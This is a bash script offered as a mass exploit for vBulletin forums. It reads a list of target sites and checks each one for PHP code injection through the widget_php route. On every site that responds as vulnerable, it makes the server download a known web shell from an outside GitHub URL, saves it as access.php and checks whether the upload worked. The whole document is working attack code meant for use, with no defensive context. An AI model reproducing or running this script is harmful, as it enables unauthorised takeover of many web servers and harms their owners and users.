#!/bin/bash
#contact me : https://fb.me/n00b.me

#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#dependencies
dependencies=( "curl" "jq" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - please wait tools trying to install $i package" && apt-get install $i -y
        echo "okeh all package compleate to install, please run again my tools"
        exit
    }
done

#banner
echo -e '''
Mass Exploit vBulletin \e[1;31m[\e[1;37m \e[1;32mAuto upload shell \e[1;31m]\e[1;37m
Author    \e[1;31m:\e[1;37m ./Lolz
Thanks to \e[1;31m:\e[1;37m JavaGhost \e[1;31m-\e[1;37m ./Shuzu404 \e[1;31m-\e[1;37m IndoXploit
'''

#asking
read -p $'Input list\e[1;31m: \e[1;32m' ask
if [[ ! -e $ask ]]; then
	echo -e "${red}File not found${white}"
	exit
fi

#execute
for i in $(cat $ask); do
	((thread=thread%50)); ((thread++==0)) && wait
	check=$(curl -m 10 -kLs "${i}/?routestring=ajax/render/widget_php" -d "widgetConfig[code]=echo shell_exec('echo JavaGhost');")
	if [[ $check =~ "JavaGhost" ]]; then
		  echo -e "${white}[${red}+${white}] ${yellow}VULN ${red}:${white} ${i}${white}"
		echo -e "${white}[${red}+${white}] ${green}Trying to upload shell${white}"
		curl -s "${i}" -d "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('curl -so access.php https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php');" >/dev/null 2>&1 #password shell : IndoXploit
		echo -e "${white}[${red}+${white}] ${green}Checking shell${white}" &
		true=$(curl -s "${i}" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
		if [[ $true =~ "IndoXploit" ]]; then
			echo -e "[${red}+${white}]${green} Shell uploaded!\n${white}[${red}+${white}] ${green}Access${red} : ${yellow}${i}/access.php${white}\n"
		else
			echo "[${red}+${white}]${green} ${yellow}Shell not uploaded${white}\n"
		fi
	else
		echo -e "[${red}+${white}] NOT VULN ${red}:${white} ${i}"
	fi
done
wait
